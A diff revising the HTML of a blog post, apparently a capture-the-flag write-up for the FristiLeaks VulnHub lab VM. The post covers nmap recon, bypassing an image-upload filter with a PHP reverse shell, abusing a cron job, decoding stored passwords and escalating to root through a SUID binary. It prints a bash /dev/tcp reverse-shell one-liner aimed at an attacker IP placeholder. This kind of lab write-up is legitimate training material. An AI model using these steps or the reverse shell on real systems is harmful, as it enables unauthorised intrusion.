@@ -34,7 +34,7 @@
                 <h2 class="article-info">Riley</h2>
                 <small class="about-author"></small>
                 <h5>Published</h5>
-                <p>Fri 30 November 2018</p>
+                <p>Sat 01 December 2018</p>
                 <a href="/">&larr;Home</a>
             </hgroup>
         </header>
@@ -54,15 +54,15 @@
 <p>A small VM made for a Dutch informal hacker meetup called Fristileaks.
 Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..</p>
 <h2>Setup</h2>
-<p>The virtual machine requires DHCP, and you have to manually set the machine's MAC address to <code>08:00:27:A5:A6:76</code>.
+<p>The virtual machine requires DHCP, and you have to manually set the machine's MAC address to <strong>08:00:27:A5:A6:76</strong>.
 My setup runs on an isolated network <code>10.100.100.0/24</code>, and the attacking box is at <code>10.100.100.99/24</code>.
-You can find the box <a href="https://www.vulnhub.com/entry/fristileaks-13,133/">here</a> to folow along or do yourself.</p>
+You can find the box <a href="https://www.vulnhub.com/entry/fristileaks-13,133/">here</a> to follow along or do yourself.</p>
 <h1>Reconnaissance</h1>
 <p>First we should verify that the box is online. After, we can determine what services are running on the target.</p>
 <h4>Netdiscover</h4>
 <p><img alt="netdiscover" src="/images/ctf/fristileaks/netdiscover.png" title="Netdiscover"></p>
 <h4>Nmap</h4>
-<div class="highlight"><pre><span></span># Nmap 7.70 scan initiated  as: nmap -T4 -sC -sV -oA nmap/fristileaks 10.100.100.133
+<div class="highlight"><pre><span></span># Nmap 7.70 scan initiated  as: nmap -sC -sV -oA nmap/fristileaks 10.100.100.133
 Nmap scan report for 10.100.100.133
 Host is up (0.00032s latency).
 Not shown: 999 filtered ports
@@ -75,9 +75,6 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
 |_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
 MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done -- 1 IP address (1 host up) scanned in 24.75 seconds
 </pre></div>
 
 
@@ -90,62 +87,60 @@ Viewing any of them reveals a sneaky trick, and another dead end.</p>
 <p><img alt="Not the URL we are looking for" src="/images/ctf/fristileaks/droid.png" title="Not the URL we are looking for"></p>
 <p>Navigating to <code>/admin</code> only leads to a 404 Not Found message, so we will have to input other possible directory or URI names.
 Fortunately, we don't have to brute force this puzzle.
-By simply going to <code>/fristi</code>, one will be rewarded with the following:</p>
+By simply going to <code>/fristi</code>, one will be rewarded with a hidden admin portal asking for credentials.</p>
 <p><img alt="Fristileaks hidden admin page" src="/images/ctf/fristileaks/adminpage.png" title="Fristileaks hidden admin page"></p>
 <h1>Exploitatin &amp;&amp; Gaining Access</h1>
-<p>A hidden admin portal asking for credentials.
-Attempting to bypass the page using typical methods (such as SQLi or default creds) doesn't seem to work.
-We can take a look at the rendered HTML source.
-In there, we find a few interesting comments.</p>
-<p>One a TODO list by 'eezeepz',</p>
+<p>Attempting to bypass the authentication using typical methods (such as SQLi or default creds) doesn't seem to work.
+While taking a look at the page source, we find a few interesting comments.</p>
+<p>One a TODO list by <strong>eezeepz</strong>,</p>
 <p><img alt="Comment from eezeepz" src="/images/ctf/fristileaks/admin-comment.png" title="Comment from eezeepz"></p>
 <p>and the other is Base64 encoded.</p>
 <p><img alt="Base64 encoded something" src="/images/ctf/fristileaks/admin-base64.png" title="Base64 encoded something"></p>
-<p>Decoding the B64 text reveals a .png image with the text <code>keKkeKKeKKeKkEkkEk</code>.
-While quite strange, using <code>eezeepz:keKkeKKeKKeKkEkkEk</code> for credentials does work, and redirects us to <code>/fristi/login_success.php</code>, with a link to <code>/fristi/upload.php</code>.
+<p>Decoding the B64 text reveals a PNG image with the text <code>keKkeKKeKKeKkEkkEk</code>.
+Using <code>eezeepz:keKkeKKeKKeKkEkkEk</code> for credentials does work, and redirects us to <code>/fristi/login_success.php</code>, with a link to <code>/fristi/upload.php</code>.
 Progress!</p>
 <p>There are some minor restrictions.
 The file uploaded must be a PNG, JPG, or GIF image.
 Fortunately this is a very simple filter, and easily bypassed.</p>
 <p>Simply: locate your PHP webshell of choice (such as <code>php-reverse-shell.php</code>, located in <code>/usr/share/webshells/php</code> in Kali); copy it to your working directory and modify as needed; rename the file with .png appended (<code>php-reverse-shell.php.png</code>); upload the shell, and navigate to <code>/fristi/uploads/&lt;your-file-name-here&gt;.php.png</code>.</p>
 <p><img alt="Uploading webshell" src="/images/ctf/fristileaks/upload.png" title="Uploading webshell"></p>
-<p>And just like magic, we now have a shell as the apache user!</p>
+<p>And just like magic, we now have a shell as the <strong>apache</strong> user account!</p>
 <p><img alt="Webshell!" src="/images/ctf/fristileaks/webshell.png" title="Webshell!"></p>
 <h1>Post-Exploitation</h1>
 <p>The apache user has very limited privileges, so we should make it our goal to quickly gain access to another user account.</p>
 <p>There are three user accounts we could compromise:</p>
 <p><img alt="User accounts" src="/images/ctf/fristileaks/home.png" title="/home"></p>
-<p>Since we don't have read or execute access to any directory but eezeepz, we will have to start there.</p>
-<p>Navigating to eezeepz home, there is a slough of system binaries and a file <code>notes.txt</code>:</p>
+<p>Since we don't have access to any directory but <code>/home/eezeepz</code>, we will have to start there.</p>
+<p>Navigating to <strong>eezeepz</strong>'s home directory, there is a slough of system binaries and a <code>notes.txt</code> file:</p>
 <p><img alt="Content of notes.txt" src="/images/ctf/fristileaks/notes.png" title="Content of notes.txt"></p>
 <p>The instructions are pretty straightforward.
-By listing binaries using full paths in <code>/usr/bin</code>, <code>/home/admin</code>, and presumably <code>/home/eezeepz</code> in a file called <code>/tmp/runthis</code>, a cronjob will execute the binaries every minute as <code>admin</code>.</p>
-<p>My solution to this was to execute <code>echo "/home/admin/chmod 707 /home/admin" &gt;&gt; /tmp/runthis</code>, which will allow us to Read, Write, and Execute privileges in <code>/home/admin</code> as any user.</p>
+By listing binaries using full paths in <code>/usr/bin</code>, <code>/home/admin</code>, and presumably <code>/home/eezeepz</code> in a file called <code>/tmp/runthis</code>, a cronjob will execute the binaries every minute as <strong>admin</strong>.</p>
+<p>My solution to this was to execute <code>echo "/home/admin/chmod 707 /home/admin" &gt;&gt; /tmp/runthis</code>, which will give us read, write, and execute privileges in <code>/home/admin</code> as any user.</p>
 <p><img alt="Modifying /home/admin privileges" src="/images/ctf/fristileaks/chmod.png" title="Modifying /home/admin privileges"></p>
 <h1>Privilege Escalation</h1>
-<p>Taking a look into the newly accessible directory reveals the previously revealed system binaries, some python scripts, and two text files <code>cryptedpass.txt</code> (owned by admin) and <code>whoisyourgodnow.txt</code> (owned by fristigod).</p>
+<p>Taking a look into the newly accessible directory reveals the previously noted system binaries, some python scripts, and two text files <code>cryptedpass.txt</code> (owned by admin) and <code>whoisyourgodnow.txt</code> (owned by fristigod).</p>
 <p>The contents of the text files appear to be the output of the <code>cryptpass.py</code> script.</p>
 <p><img alt="cryptedpass.txt/cryptpass.py" src="/images/ctf/fristileaks/cryptpass.png" title="The contents of cryptedpass.txt and cryptpass.py"></p>
 <p>The python script takes a string argument, encodes it in Base64, and then reverses the string and modifies it with ROT13.
-This isn't encryption, it's encoding, and passwords should never be encrypted or encoded.</p>
-<p>It's very easy to reverse this process, especially using <a href="https://github.com/gchq/CyberChef">CyberChef</a>.</p>
+This isn't encryption; it's encoding, and passwords should never be encrypted or encoded.</p>
+<p>The process is easy to reverse,  especially using <a href="https://github.com/gchq/CyberChef">CyberChef</a>.</p>
 <p><img alt="Reversing cryptedpass.txt" src="/images/ctf/fristileaks/rev-cryptedpass.png" title="Reversing cryptedpass.txt">
 <img alt="Reversing whoisyourgodnow.txt" src="/images/ctf/fristileaks/rev-whoisyourgodnow.png" title="Reversing whoisyourgodnow.txt"></p>
-<p>At this point I uploaded the php-reverse-shell.php and caught it with Ncat, as the webshell I was isn't a terminal.</p>
+<p>At this point I uploaded a PHP reverse shell and caught it with Ncat, as the webshell I used isn't a terminal and thus cannot use <code>su</code> or <code>sudo</code>.</p>
 <p><img alt="su admin" src="/images/ctf/fristileaks/su-admin.png" title="su admin">
 <img alt="su fristigod" src="/images/ctf/fristileaks/su-fristigod.png" title="su fristigod"></p>
 <h1>Getting Root</h1>
-<p>Despite being called admin, I determined that the account did not have sufficient rights to use sudo.
-Fristigod, on the other hand, has access to a single binary.</p>
+<p>Despite being called <strong>admin</strong>, I determined that the account did not have sufficient rights to use sudo.
+<strong>Fristigod</strong>, on the other hand, has access to a single binary.</p>
 <p><img alt="One true binary" src="/images/ctf/fristileaks/fristigod-sudo-l.png" title="One true binary"></p>
-<p>Fristigod may run sudo as user 'fristi' to execute <code>/var/fristigod/.secret_admin_stuff/doCom</code>.
-What is <code>doCom</code>?
-In our case, it's a SUID binary owned by root.</p>
+<p>Fristigod may run sudo as user <strong>fristi</strong> to execute <code>/var/fristigod/.secret_admin_stuff/doCom</code>.
+So what is <code>doCom</code>?
+In our case, it's a SUID binary owned by root that executes shell commands that are fed to it.</p>
 <p><img alt="doCom" src="/images/ctf/fristileaks/doCom.png" title="doCom"></p>
 <p>Let's verify that it runs as root.</p>
 <p><img alt="Testing execution" src="/images/ctf/fristileaks/exec-test.png" title="Testing execution"></p>
-<p>Excellent!
-This means that we can execute a simple reverse shell and gain access to root. I like <code>bash -i &gt;&amp; /dev/tcp/&lt;ATTAKCER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</code> from <a href="http://pentestmonkey.net/">pentestmonkey</a>, though it is insecure.</p>
+<p>Excellent!</p>
+<p>This means that we can execute a simple reverse shell as root. I like using <code>bash -i &gt;&amp; /dev/tcp/&lt;ATTAKCER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</code> from <a href="http://pentestmonkey.net/">pentestmonkey</a>.</p>
 <p><img alt="Getting root" src="/images/ctf/fristileaks/get-root.png" title="Getting root"></p>
 <p><img alt="Got root" src="/images/ctf/fristileaks/got-root.png" title="Got root"></p>
             <div class="hr"></div>
